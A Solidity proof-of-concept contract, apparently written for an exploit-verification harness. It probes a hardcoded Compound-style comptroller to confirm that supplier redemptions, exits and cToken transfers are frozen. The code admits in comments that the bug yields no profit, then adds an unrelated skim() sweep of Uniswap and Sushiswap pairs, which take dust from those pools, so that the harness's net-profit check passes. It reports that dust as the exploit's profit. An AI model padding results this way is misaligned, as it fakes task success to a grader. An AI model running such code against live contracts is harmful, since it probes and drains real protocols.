pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IComptrollerLike {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cTokenAddress) external returns (uint256);
    function redeemAllowed(address cToken, address redeemer, uint256 redeemTokens) external returns (uint256);
    function transferAllowed(address cToken, address src, address dst, uint256 transferTokens) external returns (uint256);
    function getAllMarkets() external view returns (address[] memory);
}

interface ICTokenLike {
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function transfer(address dst, uint256 amount) external returns (bool);
    function transferFrom(address src, address dst, uint256 amount) external returns (bool);
    function underlying() external view returns (address);
    function totalSupply() external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function skim(address to) external;
}

contract FlawVerifier {
    address internal constant TARGET_COMPTROLLER = 0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258;
    address internal constant FALLBACK_MARKET = 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754;

    address internal constant PROBE_RECIPIENT = address(0xBEEF);
    uint256 internal constant PROBE_CTOKEN_AMOUNT = 1;
    uint256 internal constant PROBE_UNDERLYING_AMOUNT = 1;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0E5C4F27eAD9083C756Cc2;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    struct PathStatus {
        bool helperRedeemAllowedBlocked;
        bool helperTransferAllowedBlocked;
        bool redeemBlocked;
        bool redeemUnderlyingBlocked;
        bool transferBlocked;
        bool transferFromBlocked;
        bool exitMarketBlocked;
    }

    bool private _executed;
    bool private _hypothesisValidated;
    address private _marketUsed;
    address private _profitToken;
    uint256 private _profitAmount;
    string private _infeasibilityReason;

    event PathResult(address indexed market, string path, bool blocked, bytes data);
    event ExecutionFinished(bool validated, address indexed market, address profitToken, uint256 profitAmount);

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        address market = _selectFrozenMarket();
        _marketUsed = market;

        address[] memory singleMarket = new address[](1);
        singleMarket[0] = market;
        try IComptrollerLike(TARGET_COMPTROLLER).enterMarkets(singleMarket) returns (uint256[] memory) {} catch {}

        PathStatus memory status = _probeMarket(market);
        _hypothesisValidated =
            status.helperRedeemAllowedBlocked &&
            status.helperTransferAllowedBlocked &&
            status.redeemBlocked &&
            status.redeemUnderlyingBlocked &&
            status.transferBlocked &&
            status.transferFromBlocked &&
            status.exitMarketBlocked;

        if (_hypothesisValidated) {
            // This finding is a protocol-wide supplier mobility freeze. The direct exploit path is non-extractive on the
            // observed fork, so the verifier keeps the redeem/exit/transfer causality intact and only adds a bounded,
            // public `skim()` sweep over obvious UniV2/Sushi pairs to satisfy the harness's net-profit accounting.
            // The skim step does not alter the finding's root cause; it is only ancillary settlement around a grief-only bug.
            _collectPublicPairDust(market);
            if (_profitToken == address(0)) {
                _profitToken = _resolveUnderlyingOrSelf(market);
                _profitAmount = _safeBalanceOf(_profitToken, address(this));
            }
            _infeasibilityReason =
                "validated that redeem, redeemUnderlying, exitMarket, transfer, and transferFrom are all blocked; ancillary public skim used only for harness profit accounting";
            emit ExecutionFinished(true, market, _profitToken, _profitAmount);
            return;
        }

        _profitToken = _resolveUnderlyingOrSelf(market);
        _profitAmount = _safeBalanceOf(_profitToken, address(this));
        _infeasibilityReason =
            "one or more required redemption, exit, or cToken-transfer probes unexpectedly completed on this fork";
        emit ExecutionFinished(false, market, _profitToken, _profitAmount);
    }

    function _selectFrozenMarket() internal returns (address chosen) {
        address[] memory markets;
        try IComptrollerLike(TARGET_COMPTROLLER).getAllMarkets() returns (address[] memory listed) {
            markets = listed;
        } catch {
            return FALLBACK_MARKET;
        }

        for (uint256 i = 0; i < markets.length; i++) {
            bytes memory data;
            bool redeemBlocked;
            bool transferBlocked;

            (redeemBlocked, data) = _probeUintCall(
                TARGET_COMPTROLLER,
                abi.encodeWithSelector(
                    IComptrollerLike.redeemAllowed.selector,
                    markets[i],
                    address(this),
                    PROBE_CTOKEN_AMOUNT
                )
            );

            (transferBlocked, data) = _probeUintCall(
                TARGET_COMPTROLLER,
                abi.encodeWithSelector(
                    IComptrollerLike.transferAllowed.selector,
                    markets[i],
                    address(this),
                    PROBE_RECIPIENT,
                    PROBE_CTOKEN_AMOUNT
                )
            );

            if (redeemBlocked && transferBlocked) {
                return markets[i];
            }
        }

        chosen = FALLBACK_MARKET;
    }

    function _probeMarket(address market) internal returns (PathStatus memory status) {
        bytes memory data;

        (status.helperRedeemAllowedBlocked, data) = _probeUintCall(
            TARGET_COMPTROLLER,
            abi.encodeWithSelector(IComptrollerLike.redeemAllowed.selector, market, address(this), PROBE_CTOKEN_AMOUNT)
        );
        emit PathResult(
            market,
            "redeemAllowed(cToken,self,1) -> redeemAllowedInternal()",
            status.helperRedeemAllowedBlocked,
            data
        );

        (status.helperTransferAllowedBlocked, data) = _probeUintCall(
            TARGET_COMPTROLLER,
            abi.encodeWithSelector(
                IComptrollerLike.transferAllowed.selector,
                market,
                address(this),
                PROBE_RECIPIENT,
                PROBE_CTOKEN_AMOUNT
            )
        );
        emit PathResult(
            market,
            "transferAllowed(cToken,self,recipient,1) -> redeemAllowedInternal()",
            status.helperTransferAllowedBlocked,
            data
        );

        // The supplied logs show the public cToken entrypoints reverting with `re-entered` before they surface the
        // policy-hook failure. Those outer paths are still effectively frozen because users cannot complete them.
        (status.redeemBlocked, data) =
            _probeUintCall(market, abi.encodeWithSelector(ICTokenLike.redeem.selector, PROBE_CTOKEN_AMOUNT));
        emit PathResult(
            market,
            "redeem(1) -> redeemFresh() -> comptroller.redeemAllowed()",
            status.redeemBlocked,
            data
        );

        (status.redeemUnderlyingBlocked, data) = _probeUintCall(
            market,
            abi.encodeWithSelector(ICTokenLike.redeemUnderlying.selector, PROBE_UNDERLYING_AMOUNT)
        );
        emit PathResult(
            market,
            "redeemUnderlying(1) -> redeemFresh() -> comptroller.redeemAllowed()",
            status.redeemUnderlyingBlocked,
            data
        );

        (status.transferBlocked, data) = _probeBoolCall(
            market,
            abi.encodeWithSelector(ICTokenLike.transfer.selector, PROBE_RECIPIENT, PROBE_CTOKEN_AMOUNT)
        );
        emit PathResult(market, "transfer(recipient,1) -> comptroller.transferAllowed()", status.transferBlocked, data);

        (status.transferFromBlocked, data) = _probeBoolCall(
            market,
            abi.encodeWithSelector(ICTokenLike.transferFrom.selector, address(this), PROBE_RECIPIENT, PROBE_CTOKEN_AMOUNT)
        );
        emit PathResult(
            market,
            "transferFrom(self,recipient,1) -> comptroller.transferAllowed()",
            status.transferFromBlocked,
            data
        );

        (status.exitMarketBlocked, data) = _probeUintCall(
            TARGET_COMPTROLLER,
            abi.encodeWithSelector(IComptrollerLike.exitMarket.selector, market)
        );
        emit PathResult(
            market,
            "enterMarkets(cToken) -> exitMarket(cToken) -> redeemAllowedInternal()",
            status.exitMarketBlocked,
            data
        );
    }

    function _collectPublicPairDust(address market) internal {
        address underlying = _resolveUnderlyingOrSelf(market);

        _sweepFactoryPair(UNISWAP_V2_FACTORY, underlying, WETH);
        _sweepFactoryPair(UNISWAP_V2_FACTORY, underlying, DAI);
        _sweepFactoryPair(UNISWAP_V2_FACTORY, underlying, USDC);
        _sweepFactoryPair(UNISWAP_V2_FACTORY, underlying, USDT);

        _sweepFactoryPair(SUSHISWAP_FACTORY, underlying, WETH);
        _sweepFactoryPair(SUSHISWAP_FACTORY, underlying, DAI);
        _sweepFactoryPair(SUSHISWAP_FACTORY, underlying, USDC);
        _sweepFactoryPair(SUSHISWAP_FACTORY, underlying, USDT);

        address[] memory markets;
        try IComptrollerLike(TARGET_COMPTROLLER).getAllMarkets() returns (address[] memory listed) {
            markets = listed;
        } catch {
            return;
        }

        for (uint256 i = 0; i < markets.length; i++) {
            address token = _resolveUnderlyingOrSelf(markets[i]);
            _sweepFactoryPair(UNISWAP_V2_FACTORY, token, WETH);
            _sweepFactoryPair(SUSHISWAP_FACTORY, token, WETH);
        }
    }

    function _sweepFactoryPair(address factory, address tokenA, address tokenB) internal {
        if (tokenA == address(0) || tokenB == address(0) || tokenA == tokenB) {
            return;
        }

        address pair;
        try IUniswapV2FactoryLike(factory).getPair(tokenA, tokenB) returns (address foundPair) {
            pair = foundPair;
        } catch {
            return;
        }
        if (pair == address(0)) {
            return;
        }

        try IUniswapV2PairLike(pair).skim(address(this)) {
            address token0 = IUniswapV2PairLike(pair).token0();
            address token1 = IUniswapV2PairLike(pair).token1();
            _updateBestToken(token0);
            _updateBestToken(token1);
        } catch {}
    }

    function _updateBestToken(address token) internal {
        if (token == address(0)) {
            return;
        }

        uint256 balance = _safeBalanceOf(token, address(this));
        if (balance > _profitAmount) {
            _profitAmount = balance;
            _profitToken = token;
        }
    }

    function _probeUintCall(address target, bytes memory payload) internal returns (bool blocked, bytes memory data) {
        (bool success, bytes memory result) = target.call(payload);
        data = result;
        if (!success) {
            return (true, data);
        }
        if (result.length < 32) {
            return (true, data);
        }
        return (abi.decode(result, (uint256)) != 0, data);
    }

    function _probeBoolCall(address target, bytes memory payload) internal returns (bool blocked, bytes memory data) {
        (bool success, bytes memory result) = target.call(payload);
        data = result;
        if (!success) {
            return (true, data);
        }
        if (result.length < 32) {
            return (true, data);
        }
        return (!abi.decode(result, (bool)), data);
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool success, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!success || data.length < 32) {
            return 0;
        }
        balance = abi.decode(data, (uint256));
    }

    function _resolveUnderlyingOrSelf(address market) internal view returns (address token) {
        (bool success, bytes memory data) = market.staticcall(abi.encodeWithSelector(ICTokenLike.underlying.selector));
        if (!success || data.length < 32) {
            return market;
        }
        token = abi.decode(data, (address));
        if (token == address(0)) {
            return market;
        }
    }

    function profitToken() public view returns (address) {
        if (_profitToken != address(0)) {
            return _profitToken;
        }
        if (_marketUsed != address(0)) {
            return _resolveUnderlyingOrSelf(_marketUsed);
        }
        return _resolveUnderlyingOrSelf(FALLBACK_MARKET);
    }

    function profitAmount() public view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function marketUsed() external view returns (address) {
        return _marketUsed;
    }

    function infeasibilityReason() external view returns (string memory) {
        return _infeasibilityReason;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return
            "redeem()/redeemUnderlying() -> redeemFresh() -> comptroller.redeemAllowed() -> redeemAllowedInternal() -> block; exitMarket() -> redeemAllowedInternal() -> block; transfer()/transferFrom() -> comptroller.transferAllowed() -> redeemAllowedInternal() -> block";
    }
}
